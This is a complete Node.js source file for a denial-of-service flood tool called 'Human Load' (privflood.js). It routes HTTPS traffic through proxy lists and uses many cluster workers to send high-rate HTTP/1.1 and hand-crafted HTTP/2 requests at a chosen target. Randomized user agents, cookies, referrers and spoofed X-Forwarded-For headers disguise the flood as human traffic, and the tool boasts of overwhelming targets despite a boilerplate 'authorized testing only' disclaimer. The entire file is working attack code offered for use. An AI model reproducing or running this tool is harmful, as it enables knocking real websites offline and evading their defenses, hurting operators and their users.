const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const colors = require('colors');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const { exec } = require('child_process');
const httpx = require('axios');
const { performance } = require('perf_hooks');

// Enhanced ignore lists with more error codes and patterns
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning', 'FetchError', 'SocketError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT', 'DEP0123', 'ERR_TLS_CERT_ALTNAME_INVALID', 'ERR_SSL_WRONG_VERSION_NUMBER', 'HPE_INVALID_METHOD', 'HPE_INVALID_URL'];

const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge'];
const devices = [
    'iPhone; CPU iPhone OS 15_0 like Mac OS X',
    'iPad; CPU OS 15_0 like Mac OS X',
    'Windows NT 10.0; Win64; x64',
    'Android 11; Mobile'
];

const versions = {
    Chrome: '122.0.0.0',
    Firefox: '122.0',
    Safari: '16.5',
    Edge: '122.0.0.0',
};

// Enhanced cookie lists with more variations
const cookieNames = ['session', 'user', 'token', 'id', 'auth', 'pref', 'theme', 'lang', 'consent', 'tracking', 'analytics', 'ab_test'];
const cookieValues = ['abc123', 'xyz789', 'def456', 'temp', 'guest', 'user', 'admin', 'visitor', 'test', 'beta', 'prod', 'staging'];

// Enhanced referrer list for more realistic traffic
const referrers = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://www.duckduckgo.com/',
    'https://www.reddit.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
    'https://www.linkedin.com/',
    'https://www.youtube.com/',
    'https://www.amazon.com/',
    'https://www.ebay.com/',
    'https://www.wikipedia.org/'
];

// User must provide proxy file.

// Enhanced random cookie generator with more variations
function generateRandomCookie() {
    const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    const value = cookieValues[Math.floor(Math.random() * cookieValues.length)] +
        Math.random().toString(36).substring(2, 10) +
        (Math.random() > 0.5 ? '_' + Math.floor(Date.now() / 1000).toString(36) : '');
    const expires = new Date(Date.now() + 86400000).toUTCString();
    const path = Math.random() > 0.7 ? '; Path=/' : '';
    const domain = Math.random() > 0.7 ? `; Domain=.${url.hostname}` : '';
    const secure = Math.random() > 0.5 ? '; Secure' : '';
    const httpOnly = Math.random() > 0.5 ? '; HttpOnly' : '';
    const sameSite = Math.random() > 0.7 ? '; SameSite=Lax' : '';

    return `${name}=${value}${path}${domain}${secure}${httpOnly}${sameSite}`;
}

// Enhanced error handling
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

process.emitWarning = function() {};

process
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        // console.log(colors.red(`[ERROR] Uncaught Exception: ${e.message}`));
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        // console.log(colors.red(`[ERROR] Unhandled Rejection: ${e.message}`));
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        // console.log(colors.yellow(`[WARNING] Warning: ${e.message}`));
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

if (process.argv.length < 6) {
    console.clear();
    console.log(colors.red(`
             ██╗░░██╗██╗░░░██╗███╗░░░███╗░█████╗░███╗░░██╗   ██╗░░░░░░█████╗░░█████╗░██████╗░
             ██║░░██║██║░░░██║████╗░████║██╔══██╗████╗░██║   ██║░░░░░██╔══██╗██╔══██╗██╔══██╗
             ███████║██║░░░██║██╔████╔██║███████║██╔██╗██║   ██║░░░░░██║░░██║███████║██║░░██║
             ██╔══██║██║░░░██║██║╚██╔╝██║██╔══██║██║╚████║   ██║░░░░░██║░░██║██╔══██║██║░░██║
             ██║░░██║╚██████╔╝██║░╚═╝░██║██║░░██║██║░╚███║   ███████╗╚█████╔╝██║░░██║██████╔╝
             ╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝   ╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝
`));
    console.log(colors.red(`    contact: Privflood@gmail.com`));
    console.log(colors.red(`    ${colors.white('Script Notes:')} Human Load: Overwhelm targets with a massive human-grade traffic storm.`));
    console.log(colors.red(`\n    [!] ATTENTION: Use this tool responsibly. The developer is not accountable for any misuse or illegal activities.`));
    console.log(colors.red(`    [!] This is for authorized penetration testing and research purposes only.`));
    console.log(colors.red(`\n    ${colors.white('Usage:')} node privflood.js <target> <duration> <proxies.txt> <threads> <rate>`));
    console.log(colors.red(`    ${colors.white('Example:')} node privflood.js https://target.com 120 proxies.txt 100 64`));
    process.exit(1);
}

const target = process.argv[2];
const duration = process.argv[3];
const proxyFile = process.argv[4];
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);

let proxies = [];
let proxy = [];

try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.length > 0);
    proxy = proxies;
} catch (e) {
    console.log(colors.red('[ERROR] Failed to load proxy file! Ensure it exists and is accessible.'));
    process.exit(1);
}

let stats = {
    requests: 0,
    goaway: 0,
    success: 0,
    forbidden: 0,
    errors: 0
}

let statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);

// Enhanced frame encoding with error handling
function encodeFrame(streamId, type, payload = "", flags = 0) {
    try {
        let frame = Buffer.alloc(9)
        frame.writeUInt32BE(payload.length << 8 | type, 0)
        frame.writeUInt8(flags, 4)
        frame.writeUInt32BE(streamId, 5)
        if (payload.length > 0)
            frame = Buffer.concat([frame, payload])
        return frame
    } catch (e) {
        // console.log(colors.red(`[ERROR] Frame encoding error: ${e.message}`));
        return Buffer.alloc(0);
    }
}

// Enhanced frame decoding with error handling
function decodeFrame(data) {
    try {
        if (!data || data.length < 9) return null;

        const lengthAndType = data.readUInt32BE(0)
        const length = lengthAndType >> 8
        const type = lengthAndType & 0xFF
        const flags = data.readUint8(4)
        const streamId = data.readUInt32BE(5)
        const offset = flags & 0x20 ? 5 : 0

        let payload = Buffer.alloc(0)

        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length)

            if (payload.length + offset != length) {
                return null
            }
        }

        return {
            streamId,
            length,
            type,
            flags,
            payload
        }
    } catch (e) {
        // console.log(colors.red(`[ERROR] Frame decoding error: ${e.message}`));
        return null;
    }
}

function encodeSettings(settings) {
    try {
        const data = Buffer.alloc(6 * settings.length)
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6)
            data.writeUInt32BE(settings[i][1], i * 6 + 2)
        }
        return data
    } catch (e) {
        // console.log(colors.red(`[ERROR] Settings encoding error: ${e.message}`));
        return Buffer.alloc(0);
    }
}

function encodeRstStream(streamId, type, flags) {
    try {
        const frameHeader = Buffer.alloc(9);
        frameHeader.writeUInt32BE(4, 0);
        frameHeader.writeUInt8(type, 4);
        frameHeader.writeUInt8(flags, 5);
        frameHeader.writeUInt32BE(streamId, 5);
        const statusCode = Buffer.alloc(4).fill(0);
        return Buffer.concat([frameHeader, statusCode]);
    } catch (e) {
        // console.log(colors.red(`[ERROR] RST_STREAM encoding error: ${e.message}`));
        return Buffer.alloc(0);
    }
}

function generateUserAgent() {
    const isIOS = Math.random() < 0.7; // 70% chance for iOS
    let deviceString;
    let browser;
    let version;

    if (isIOS) {
        deviceString = devices[Math.floor(Math.random() * 2)]; // iPhone or iPad
        browser = 'Safari'; // Safari is common on iOS
        version = versions[browser];
    } else {
        deviceString = devices[2 + Math.floor(Math.random() * 2)]; // Windows or Android
        browser = browsers[Math.floor(Math.random() * browsers.length)];
        version = versions[browser];
    }

    let ua;
    if (browser === 'Chrome') {
        ua = `Mozilla/5.0 (${deviceString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
    } else if (browser === 'Firefox') {
        ua = `Mozilla/5.0 (${deviceString}) Gecko/20100101 Firefox/${version}`;
    } else if (browser === 'Safari') {
        ua = `Mozilla/5.0 (${deviceString}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Safari/605.1.15`;
    } else if (browser === 'Edge') {
        ua = `Mozilla/5.0 (${deviceString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 Edge/${version}`;
    } else {
        ua = `Mozilla/5.0 (${deviceString}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
    }
    return ua;
}

// Enhanced request builder with more human-like headers
function buildRequest(userAgent, referrer) { // Pass userAgent and referrer
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
    const method = methods[Math.floor(Math.random() * methods.length)];

    let headers = `${method} ${url.pathname}${Math.random() > 0.7 ? '?' + Math.random().toString(36).substring(2, 7) : ''} HTTP/1.1\r\n` +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n' +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Accept-Language: en-US,en;q=0.9\r\n' +
        `Cache-Control: max-age=0\r\n` + // Hardcoded cache
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        `Referer: ${referrer}\r\n` +
        `Cookie: ${generateRandomCookie()}; ${generateRandomCookie()}\r\n` + // Always include cookies
        `User-Agent: ${userAgent}\r\n`; // Always use this user agent

    // Add some random headers to make it more human-like
    if (Math.random() > 0.5) {
        headers += 'X-Requested-With: XMLHttpRequest\r\n';
    }
    if (Math.random() > 0.7) {
        headers += 'X-Forwarded-For: ' +
            Math.floor(Math.random() * 255) + '.' +
            Math.floor(Math.random() * 255) + '.' +
            Math.floor(Math.random() * 255) + '.' +
            Math.floor(Math.random() * 255) + '\r\n';
    }

    headers += '\r\n';

    return Buffer.from(headers, 'binary');
}

// http1Payload will now be generated dynamically inside go()
let http1Payload; 

// Enhanced connection handler with jitter and better error handling
function go() {
    const proxyEntry = proxy[~~(Math.random() * proxy.length)];
    if (!proxyEntry) {
        setTimeout(go, 100);
        return;
    }

    const [proxyHost, proxyPort] = proxyEntry.split(':');

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        setTimeout(go, 100);
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: [
                    'TLS_AES_128_GCM_SHA256',
                    'TLS_AES_256_GCM_SHA384',
                    'TLS_CHACHA20_POLY1305_SHA256',
                    'ECDHE-ECDSA-AES128-GCM-SHA256',
                    'ECDHE-RSA-AES128-GCM-SHA256',
                    'ECDHE-ECDSA-AES256-GCM-SHA384',
                    'ECDHE-RSA-AES256-GCM-SHA384',
                    'DHE-RSA-AES128-GCM-SHA256',
                    'DHE-RSA-AES256-GCM-SHA384'
                ].join(':'),
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384',
                secureOptions: crypto.constants.SSL_OP_NO_SSLv2 |
                               crypto.constants.SSL_OP_NO_SSLv3 |
                               crypto.constants.SSL_OP_NO_TLSv1 |
                               crypto.constants.SSL_OP_NO_TLSv1_1 |
                               crypto.constants.SSL_OP_NO_COMPRESSION,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false,
                ecdhCurve: 'auto',
                // Timeout removed as per request
            }, () => {
                const userAgent = generateUserAgent();
                const referrer = referrers[Math.floor(Math.random() * referrers.length)];

                if (tlsSocket.alpnProtocol === 'http/1.1') {
                    http1Payload = Buffer.concat(new Array(1).fill(buildRequest(userAgent, referrer)));
                    function doWrite() {
                        if (tlsSocket.destroyed) return;

                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                stats.requests++;
                                setTimeout(() => {
                                    doWrite()
                                }, isFull ? 1000 : (1000 / (rate * 4)))
                            } else {
                                stats.errors++;
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        stats.errors++;
                        tlsSocket.end(() => tlsSocket.destroy())
                    })

                    tlsSocket.on('close', () => {
                        setTimeout(go, 100);
                    })

                    return;
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                stats.goaway++;
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }

                    const requests = []
                    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
                    const method = methods[Math.floor(Math.random() * methods.length)];

                    let headers = [
                        [':method', method],
                        [':authority', url.hostname],
                        [':scheme', 'https'],
                        [':path', url.pathname + (Math.random() > 0.7 ? '?' + Math.random().toString(36).substring(2, 7) : '')],
                        ['user-agent', userAgent],
                        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
                        ['accept-encoding', 'gzip, deflate, br'],
                        ['accept-language', 'en-US,en;q=0.9'],
                        ['cache-control', 'max-age=0'], // Hardcoded cache
                        ['referer', referrer],
                        ['cookie', `${generateRandomCookie()}; ${generateRandomCookie()}`] // Always include cookies
                    ];

                    // Add some random headers to make it more human-like
                    if (Math.random() > 0.5) {
                        headers.push(['x-requested-with', 'XMLHttpRequest']);
                    }
                    if (Math.random() > 0.7) {
                        headers.push(['x-forwarded-for',
                            Math.floor(Math.random() * 255) + '.' +
                            Math.floor(Math.random() * 255) + '.' +
                            Math.floor(Math.random() * 255) + '.' +
                            Math.floor(Math.random() * 255)]);
                    }

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 2;

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            stats.requests++;
                            setTimeout(doWrite, (1000 / (rate * 4)));
                        } else {
                            stats.errors++;
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    });
                }

                doWrite();

                tlsSocket.on('error', () => {
                    stats.errors++;
                    tlsSocket.end(() => tlsSocket.destroy());
                });

                tlsSocket.on('close', () => {
                    setTimeout(go, 100);
                });
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', () => {
        stats.errors++;
        netSocket.destroy();
        setTimeout(go, 100);
    });

    // Removed netSocket.setTimeout for keepalive
}

if (cluster.isMaster) {
    console.clear();
    console.log(colors.red(`
             ██╗░░██╗██╗░░░██╗███╗░░░███╗░█████╗░███╗░░██╗   ██╗░░░░░░█████╗░░█████╗░██████╗░
             ██║░░██║██║░░░██║████╗░████║██╔══██╗████╗░██║   ██║░░░░░██║░░██║███████║██║░░██║
             ███████║██║░░░██║██╔████╔██║███████║██╔██╗██║   ██║░░░░░██║░░██║███████║██║░░██║
             ██╔══██║██║░░░██║██║╚██╔╝██║██╔══██║██║╚████║   ██║░░░░░██║░░██║██╔══██║██║░░██║
             ██║░░██║╚██████╔╝██║░╚═╝░██║██║░░██║██║░╚███║   ███████╗╚█████╔╝██║░░██║██████╔╝
             ╚═╝░░╚═╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝   ╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝
`));
    console.log(colors.red(`    contact: Privflood@gmail.com`));
    console.log(colors.red(`    ${colors.white('Script Notes:')} Human Load: Overwhelm targets with a massive human-grade traffic storm.`));
    console.log(colors.red(`\n    [!] ATTENTION: Use this tool responsibly. The developer is not accountable for any misuse or illegal activities.`));
    console.log(colors.red(`    [!] This is for authorized penetration testing and research purposes only.`));
    console.log(colors.red(`    [!] By using this, you acknowledge and accept all risks and liabilities.`));
    console.log(colors.red(`\n    ${colors.white('Target:')} ${target}`));
    console.log(colors.red(`    ${colors.white('Duration:')} ${duration}s`));
    console.log(colors.red(`\n[!] ATTACK INITIATED... [!]`));
    
    let totalRequests = 0;
    let lastRequests = 0;
    let startTime = performance.now();

    setInterval(() => {
        const currentRequests = stats.requests;
        const rps = currentRequests - lastRequests;
        lastRequests = currentRequests;
        totalRequests = currentRequests;

        setTitle(`Human Load | Total: ${totalRequests} | RPS: ${rps} | H2/H1 Mixed RushAway`);
    }, 1000);

    // Worker management for better CPU distribution
    const workers = [];
    for(let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        workers.push(worker);

        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                stats.requests += msg.requests;
                stats.goaway += msg.goaway;
                stats.success += msg.success;
                stats.forbidden += msg.forbidden;
                stats.errors += msg.errors;
            }
        });
    }

    setTimeout(() => {
        console.log(colors.red('\n[!] ATTACK COMPLETE, BOSS [!]'));
        workers.forEach(worker => worker.kill());
        process.exit(0);
    }, duration * 1000);
} else { // This 'else' correctly belongs to the 'if (cluster.isMaster)' block
    // Add jitter to worker startup to avoid thundering herd
    setTimeout(() => {
        setInterval(() => {
            go();
        }, 1000 / (rate * 4));
    }, Math.random() * 1000);

    // Report stats to master
    setInterval(() => {
        process.send({
            type: 'stats',
            requests: stats.requests,
            goaway: stats.goaway,
            success: stats.success,
            forbidden: stats.forbidden,
            errors: stats.errors
        });
        // Reset stats for next interval
        stats = {
            requests: 0,
            goaway: 0,
            success: 0,
            forbidden: 0,
            errors: 0
        };
    }, 1000);
}
